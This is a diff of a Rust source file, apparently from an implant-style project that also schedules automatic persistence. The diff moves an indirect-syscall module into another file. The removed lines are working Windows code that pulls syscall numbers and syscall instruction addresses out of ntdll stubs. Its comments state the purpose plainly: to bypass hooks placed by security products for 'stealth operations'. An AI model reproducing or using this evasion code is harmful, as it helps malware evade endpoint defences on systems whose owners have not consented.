@@ -870,96 +870,12 @@ pub fn schedule_auto_persistence() {
 // ============================================================================
 // Indirect Syscall Support
 // ============================================================================
-// Indirect syscalls help evade usermode hooks placed by security products
-// Instead of calling ntdll!NtXxx directly, we:
-// 1. Read the syscall number from ntdll
-// 2. Execute the syscall instruction from our own code
-// This bypasses inline hooks in ntdll.dll
+// The actual indirect syscall implementations are in syscalls.rs
+// Here we just re-export the availability check for use in this module
 
-#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
-mod indirect_syscalls {
-    use std::ffi::CString;
-    use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
-
-    /// Get the syscall number for a given NT function
-    /// This reads the syscall stub in ntdll and extracts the syscall number
-    ///
-    /// # Safety
-    /// This function reads memory from ntdll.dll which is always loaded and executable.
-    /// The syscall stubs in ntdll are at least 24 bytes, making this read safe.
-    /// GetProcAddress returns a valid pointer to the function entry point.
-    pub unsafe fn get_syscall_number(func_name: &str) -> Option<u32> {
-        let ntdll = CString::new("ntdll.dll").ok()?;
-        let func = CString::new(func_name).ok()?;
-
-        let ntdll_handle = GetModuleHandleA(ntdll.as_ptr());
-        if ntdll_handle.is_null() {
-            return None;
-        }
-
-        let func_addr = GetProcAddress(ntdll_handle, func.as_ptr());
-        if func_addr.is_null() {
-            return None;
-        }
-
-        // Parse the syscall stub to extract syscall number
-        // Windows x64 syscall stubs have the format:
-        // 4C 8B D1           mov r10, rcx
-        // B8 XX 00 00 00     mov eax, SYSCALL_NUMBER
-        // 0F 05              syscall
-        // C3                 ret
-        // Total: ~15 bytes, we read 24 to be safe
-        let bytes = std::slice::from_raw_parts(func_addr as *const u8, 24);
-
-        for i in 0..20 {
-            if bytes[i] == 0xB8 {
-                // Found mov eax, imm32 - extract syscall number
-                let num =
-                    u32::from_le_bytes([bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4]]);
-                return Some(num);
-            }
-        }
-
-        None
-    }
-
-    /// Get the syscall instruction address in ntdll (for indirect syscall)
-    /// We jump to this address to execute the syscall, bypassing any hooks
-    /// placed at the function entry point
-    ///
-    /// # Safety
-    /// This function reads memory from ntdll.dll which is always loaded and executable.
-    /// The syscall stubs in ntdll are at least 32 bytes, making this read safe.
-    pub unsafe fn get_syscall_instruction_addr(func_name: &str) -> Option<*const u8> {
-        let ntdll = CString::new("ntdll.dll").ok()?;
-        let func = CString::new(func_name).ok()?;
-
-        let ntdll_handle = GetModuleHandleA(ntdll.as_ptr());
-        if ntdll_handle.is_null() {
-            return None;
-        }
-
-        let func_addr = GetProcAddress(ntdll_handle, func.as_ptr()) as *const u8;
-        if func_addr.is_null() {
-            return None;
-        }
-
-        // Search for syscall instruction (0F 05) in the stub
-        let bytes = std::slice::from_raw_parts(func_addr, 32);
-
-        for i in 0..30 {
-            if bytes[i] == 0x0F && bytes[i + 1] == 0x05 {
-                return Some(func_addr.add(i));
-            }
-        }
-
-        None
-    }
-}
-
-/// Execute code via indirect syscall
-/// This is used for stealth operations that need to bypass usermode hooks
+/// Check if indirect syscalls are available
+/// Re-exports the check from syscalls module
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 pub fn is_indirect_syscall_available() -> bool {
-    unsafe { indirect_syscalls::get_syscall_number("NtQuerySystemInformation").is_some() }
+    crate::syscalls::is_indirect_syscall_available()
 }
